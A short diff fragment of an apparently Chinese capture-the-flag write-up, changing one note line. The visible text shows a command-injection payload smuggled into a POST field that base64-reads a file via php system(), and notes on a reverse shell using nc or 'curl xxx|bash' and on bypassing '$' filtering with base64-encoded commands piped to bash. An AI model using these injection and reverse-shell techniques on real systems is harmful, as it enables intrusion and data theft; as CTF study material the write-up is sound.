@@ -146,7 +146,7 @@ POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh
 
 ## 备注
 
-1. 后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx|bash弹Shell，然后find一下flag。
+1. 后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxx|bash弹Shell，然后find一下flag。
 
 2. 因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下\${foo}。至于"$"符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：
 
